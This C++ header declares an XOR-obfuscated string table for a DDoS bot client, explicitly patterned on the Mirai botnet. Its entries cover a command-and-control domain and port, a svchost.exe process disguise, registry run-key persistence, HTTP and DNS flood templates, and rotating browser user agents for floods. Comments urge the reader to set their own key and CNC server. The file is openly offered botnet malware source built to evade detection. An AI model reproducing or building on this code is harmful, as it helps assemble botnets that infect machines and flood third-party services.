// obfuscate.hpp — XOR-obfuscated string table for the bot client.
//
// Every sensitive string (CNC domain, process names, attack payloads)
// is stored XOR-encrypted in the binary. At runtime, toggle_obfuscate()
// flips each string between plaintext and ciphertext.
//
// This is Mirai's table.c pattern, modernized for C++17.
// Key: 0x45F83A21 (different from Mirai's 0xDEADBEEF — make it yours).

#pragma once

#include <cstdint>
#include <cstddef>
#include <string>
#include <string_view>
#include <array>
#include <mutex>

namespace obf {

// --- XOR key (change this for your build) ---
constexpr uint32_t XOR_KEY = 0x45F83A21;

// --- string table entry IDs ---
enum class Id : uint8_t {
    // === CNC connection ===
    CNC_DOMAIN,         // "127.0.0.1" — change to your CNC server
    CNC_PORT,           // "19443"

    // === process disguise ===
    PROC_NAME,          // "svchost.exe"  — what we look like in task manager
    PROC_TITLE,         // "Service Host: Network Service"

    // === persistence ===
    REGISTRY_KEY,       // registry run key path
    REGISTRY_VALUE,     // registry value name

    // === attack payloads ===
    HTTP_GET_TEMPLATE,  // "GET %s HTTP/1.1\r\nHost: %s\r\n..."
    HTTP_POST_TEMPLATE, // "POST %s HTTP/1.1\r\n..."
    HTTP_HEAD_TEMPLATE, // "HEAD %s HTTP/1.1\r\n..."
    DNS_QUERY_PREFIX,   // DNS query template prefix

    // === user agents (randomized during HTTP floods) ===
    UA_CHROME_WIN,
    UA_CHROME_MAC,
    UA_FIREFOX,
    UA_EDGE,
    UA_SAFARI,

    // === misc ===
    MUTEX_NAME,         // single-instance mutex
    PIPE_NAME,          // IPC pipe name (future watchdog)

    // === sentinel ===
    COUNT
};

// --- initialize the table (call once at startup) ---
void init();

// --- toggle: plaintext ↔ ciphertext ---
// Internally XORs each stored string against the four key bytes.
// Calling twice restores the original. Thread-safe.
void toggle_obfuscate(Id id);

// --- retrieve a pointer to the (plaintext) string ---
// The caller gets a view into the table's internal storage.
// Do NOT hold the pointer across toggle_obfuscate() calls.
std::string_view retrieve(Id id);

// --- convenience: unlock → read → re-lock ---
// Leaves the entry in the same (obfuscated) state it was found.
std::string retrieve_copy(Id id);

// --- lock/unlock (thin wrappers around toggle) ---
inline void lock(Id id)   { toggle_obfuscate(id); }
inline void unlock(Id id) { toggle_obfuscate(id); }

} // namespace obf
